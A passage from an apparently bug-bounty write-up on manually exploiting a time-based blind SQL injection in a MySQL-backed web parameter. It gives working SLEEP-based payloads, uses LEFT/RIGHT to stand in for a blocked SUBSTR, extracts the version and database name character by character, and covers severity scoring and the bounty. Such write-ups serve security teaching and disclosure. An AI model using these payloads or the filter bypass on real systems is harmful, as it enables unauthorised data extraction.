&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SUBSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;VERSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;CHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;did not trigger a delay for any value of &lt;em&gt;i = 48, 1, …, 57&lt;/em&gt; (the &lt;em&gt;ASCII&lt;/em&gt; codes of 0, 1, …, 9). Again, considering that the &lt;em&gt;VERSION&lt;/em&gt; function works correctly, there is no other option than that the &lt;em&gt;SUBSTR&lt;/em&gt; function is blacklisted or not available because the first character of the version must be an integer between 0 and 9.&lt;/p&gt;

&lt;p&gt;Here I thought I had a problem. However, after many tests I realized that there were some functions that worked, others that didn’t… in a seemingly random way. On the other hand, in programming languages it is quite common that a function can be rewritten in function of the others, so maybe it is possible to simulate the &lt;em&gt;SUBSTR&lt;/em&gt; function by composing other available functions. Searching in Google for MySQL functions to work with strings, I found the &lt;em&gt;&lt;a href=&quot;https://www.w3schools.com/mysql/func_mysql_left.asp&quot;&gt;LEFT&lt;/a&gt;&lt;/em&gt; and &lt;em&gt;&lt;a href=&quot;https://www.w3schools.com/MYSQL/func_mysql_right.asp&quot;&gt;RIGHT&lt;/a&gt;&lt;/em&gt; functions.&lt;/p&gt;

&lt;p&gt;After testing some payloads I found that although the &lt;em&gt;SUBSTR&lt;/em&gt; function did not work, the &lt;em&gt;LEFT&lt;/em&gt; and &lt;em&gt;RIGHT&lt;/em&gt; functions were available, so after racking my brain for a long time I discovered that the following formula is satisfied:&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;i-th letter of the string of the variable input = SUBSTR(input, i, 1) = RIGHT(LEFT(input, i), 1) for i = 1, ..., LENGTH(input)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;By reading the specifications of the &lt;em&gt;LEFT&lt;/em&gt; and &lt;em&gt;RIGHT&lt;/em&gt; functions you will see that it makes sense. You can also check it by executing the following SQL code&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;-- Set an input string and a position in the string to extract the character&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputString&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;&apos;hackcommander&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;position&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- Displays the @position character of @inputString&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;substrChar&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SUBSTR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;substrChar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- Extract and print the first @position characters of @inputString&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leftString&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;inputString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;position&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leftString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;c1&quot;&gt;-- Extract the last character of the first @position characters of @inputString&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SET&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rightChar&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;RIGHT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;leftString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rightChar&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;in the following &lt;a href=&quot;https://onecompiler.com/mysql/&quot;&gt;online MySQL code interpreter&lt;/a&gt;, as you can see in the following capture&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-bypass-blacklist-substr-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As you can see, both the &lt;em&gt;SUBSTR&lt;/em&gt; function and the composition of the &lt;em&gt;LEFT&lt;/em&gt; and &lt;em&gt;RIGHT&lt;/em&gt; functions return the sixth character of the input string.&lt;/p&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;img src=&quot;/assets/images/general/clever.gif&quot; style=&quot;width: 600px;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now using the following payload&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;RIGHT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;VERSION&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;CHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;for &lt;em&gt;i = 48, 1, …, 57&lt;/em&gt; there was a delay for &lt;em&gt;i = 56&lt;/em&gt;, as you can see in the following capture&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-bypass-blacklist-substr-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This means that the first number of the MySQL version was 8. Performing this process for each character of the string returned by the &lt;em&gt;VERSION&lt;/em&gt; function (it had 6 characters), &lt;strong&gt;I demonstrated that the version was 8.0.15&lt;/strong&gt;.&lt;/p&gt;

&lt;div id=&quot;section-id-3-1-4&quot; /&gt;

&lt;h3 id=&quot;314-weaponizing-the-payload-to-dump-the-database-name&quot;&gt;3.1.4. Weaponizing the payload to dump the database name&lt;/h3&gt;

&lt;p&gt;It is time to get some sensitive information. After trying many different functions, I found that the only available function to get the database name was the &lt;em&gt;&lt;a href=&quot;https://database.guide/schema-function-in-mysql/&quot;&gt;SCHEMA&lt;/a&gt;&lt;/em&gt; function. For some reason, the &lt;em&gt;&lt;a href=&quot;https://www.w3schools.com/sql/func_mysql_database.asp&quot;&gt;DATABASE&lt;/a&gt;&lt;/em&gt; function was not available. So, after some tests I came up with the following payload&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;LENGTH&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SCHEMA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;())&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;8&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;which causes a delay as you can see in the following capture&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-weap-payload-1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This capture shows that the &lt;em&gt;SCHEMA&lt;/em&gt; function works correctly and that it has 8 characters. Now it is only necessary to apply the payload that we have discovered to find out each of the characters of the string. The name of a database in MySQL can only be composed of the following characters&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;a-z,A-Z,0-9,_,$
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;whose associated ASCII codes are&lt;/p&gt;

&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 95, 36
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Therefore, to find out which is the database name, it is only necessary to send the following payload&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;RIGHT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SCHEMA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;CHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;for &lt;em&gt;i = 1, …, 8&lt;/em&gt; and &lt;em&gt;j = each of the ASCII codes&lt;/em&gt;, which is easy to do using the burp intruder. The responses that trigger a delay are those associated with correct characters.&lt;/p&gt;

&lt;p&gt;For example, the following payload&lt;/p&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;IF&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;RIGHT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;LEFT&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;SCHEMA&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;6&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;LIKE&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;CHAR&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;97&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;),&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;triggers a delay, as you can see in the following capture&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-weap-payload-2.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;This means that the sixth letter of the database has &lt;em&gt;ASCII&lt;/em&gt; code 97, that means, the sixth letter of the database is &lt;em&gt;a&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;However, this SQL injection was quite strange. In fact the intruder scan I sent to find out what was the sixth character returned 3 &lt;em&gt;ASCII&lt;/em&gt; characters, as you can see in the following capture&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/2024-03-19-human-1-sqlmap-0-defeating-automation-through-manual-exploitation/exploitation-weap-payload-3.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;

&lt;p&gt;A delay is triggered for the ASCII codes 65, 95 and 97, corresponding respectively to the characters A, _, a. This behavior is repeated for all the positions of the string, always returning the same letter in lowercase and uppercase, and the underscore. It does not make any sense to return the same uppercase and lowercase letter because the &lt;em&gt;LIKE&lt;/em&gt; operator is case sensitive, but it makes even less sense to always return the underscore. As I said, the strangest SQLi I have ever exploited :satisfied:.&lt;/p&gt;

&lt;div id=&quot;section-id-3-2&quot; /&gt;

&lt;h2 id=&quot;32-why-does-the-payload-work&quot;&gt;3.2. Why does the payload work??&lt;/h2&gt;

&lt;p&gt;The name of the vulnerable parameter was of the type &lt;em&gt;id&lt;/em&gt;, &lt;em&gt;value&lt;/em&gt;, &lt;em&gt;price&lt;/em&gt;… which indicates that it is a numerical parameter. In fact, this fits with the payload that Icko used during the detection because if it were a string parameter, it would have been necessary to use some single or double quotes to break the string and introduce a new predicate in the &lt;em&gt;where&lt;/em&gt; clause. However, if the parameter is numeric, there is no need to break any string, so there is no need to use single or double quotes.&lt;/p&gt;

&lt;p&gt;If we suppose that the vulnerable parameter was &lt;em&gt;id&lt;/em&gt;, the query in the backend should be similar to the following one&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;_GET&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;&quot;id&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;If we enter a “non-malicious” id, such as &lt;em&gt;1&lt;/em&gt;, the query that will be executed is&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;but if we enter a “malicious” id such as the one used by Icko during the detection&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;and no input sanitization is being applied in the backend, the query that will be executed is&lt;/p&gt;

&lt;div class=&quot;code-header&quot;&gt;
  &lt;button class=&quot;copy-code-button&quot;&gt;
    Copy
  &lt;/button&gt;
&lt;/div&gt;

&lt;div class=&quot;language-sql highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;SELECT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;name&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;description&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;FROM&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;products&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;WHERE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;id&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;AND&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;SLEEP&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;As you can see, the injected SQL code is executed in the where clause of the query.&lt;/p&gt;

&lt;p&gt;But the real question is… why the previous payloads I sent didn’t work? And the truth is that I don’t know the cause or if there were different causes. For example, not being able to use single quotes could be due to the WAF but I don’t think so. To simplify the post, I told a little lie since I said that “the quotes were sanitized”, but this was not true for all cases. When quotes were used to enclose numbers, such as ‘8’, the payload worked correctly, but when they were used to enclose characters, such as ‘hackcommander’, the payload did not work. What the hell is this? :angry:&lt;/p&gt;

&lt;p&gt;And the problem of not being able to use the &lt;em&gt;SUBSTR&lt;/em&gt; function is even stranger, although it could also have been caused by the WAF. This is the bad side of black box pentesting, sometimes we don’t know why things happen, and we will never know if we don’t get access to the source code :disappointed:.&lt;/p&gt;

&lt;div id=&quot;section-id-4&quot; /&gt;

&lt;h2 id=&quot;4-report-resolution&quot;&gt;4. Report resolution&lt;/h2&gt;

&lt;p&gt;Although it was not an important asset, it had confidential information stored in the BBDD, so we can consider that the asset criticality is medium. With respect to the severity of the vulnerability, they determined that the scoring was:&lt;/p&gt;

&lt;p style=&quot;text-align:center;&quot;&gt;&lt;b&gt;Medium (6.5) [CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N]&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;Some components of the vector don’t make much sense:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;em&gt;Confidentiality&lt;/em&gt; to &lt;em&gt;Low&lt;/em&gt; doesn’t make sense because we were told to only get harmless information, such as the name of the BBDD, and we already demonstrated that we could get it.&lt;/li&gt;
  &lt;li&gt;&lt;em&gt;Integrity&lt;/em&gt; to &lt;em&gt;Low&lt;/em&gt; doesn’t make much sense either because I didn’t prove that I could upload files or edit data.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;However, one component that does make sense and that under the severity was the &lt;em&gt;Attack Complexity&lt;/em&gt;, which was set to &lt;em&gt;Low&lt;/em&gt;, and it is normal because as we have seen the exploitation was quite difficult, and trying to dump entire tables would require a custom exploit.&lt;/p&gt;

&lt;p&gt;Therefore, the report was classified as&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;Asset criticity&lt;/strong&gt;: Medium&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Vulnerability severity&lt;/strong&gt;: Medium&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;Bounty&lt;/strong&gt;: More than $2000 (it was paid as High, maybe because it was a SQLi)&lt;/li&gt;
&lt;/ul&gt;

&lt;div id=&quot;section-id-5&quot; /&gt;

&lt;h2 id=&quot;5-lessons-learned&quot;&gt;5. Lessons learned&lt;/h2&gt;

&lt;ul&gt;
